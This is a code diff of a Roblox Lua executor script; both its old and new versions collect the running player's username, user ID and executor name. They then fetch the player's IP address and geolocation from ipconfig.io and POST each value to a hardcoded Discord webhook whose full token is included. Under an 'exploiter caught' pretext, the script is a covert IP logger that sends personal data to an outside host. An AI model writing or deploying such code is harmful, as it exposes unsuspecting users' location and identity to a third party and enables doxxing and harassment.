@@ -1,30 +1,20 @@
 local Player = game.Players.LocalPlayer
-local Content = 'player caught exploiting';
-local Avatar = game.Players:GetUserThumbnailAsync(Player.UserId,Enum.ThumbnailType.AvatarThumbnail,Enum.ThumbnailSize.Size150x150)
-local Embed = {
-    title = 'do whatever you want, info down will be sent';
-    footer = { text = game.PlaceId };
-    avatarurl = Avatar,
-    author = {
-        name = Player.Name
-        url = 'https://www.roblox.com/'..Player.UserId;
-    };
-    fields = {
-        {
-            name = 'Caught exploiting';
-            value = 'Exploit: '..getexecutorname();
-        }
-    };
-};
-for i,v in game.HttpService:JSONDecode(game:HttpGet("https://ipconfig.io/json") do
-    if type(v) == "string" then
-http_request{
-    Url = 'https://discord.com/api/webhooks/1226933576944189520/7mck8mDESiAh0oU8wcY9entcJZX-JqL2qS17p1m8_ZnNiMGlGBIha2ipiLxPt0Ohexdp';
-    Method = 'POST';
-    Headers = {
-        ['Content-Type'] = 'application/json';
-    };
-    Body = game:GetService'HttpService':JSONEncode( { content = v; embeds = { Embed } } );
-};
-    end
-  end
+local url = "https://discord.com/api/webhooks/1226933576944189520/7mck8mDESiAh0oU8wcY9entcJZX-JqL2qS17p1m8_ZnNiMGlGBIha2ipiLxPt0Ohexdp"
+local data = {
+   ["content"] = "Player "..Player.Name.." ("..tostring(Player.UserId)..") has been caught exploiting with: "..getexecutorname(),
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+for i,v in game.HttpService:JSONDecode(game:HttpGet("https://ipconfig.io/json")) do
+data["content"] = tostring(i)..":"..tostring(v)
+local newdatanew = game:GetService("HttpService"):JSONEncode(data)
+local newabc = {Url = url, Body = newdatanew, Method = "POST", Headers = headers}
+request(newabc)
+end
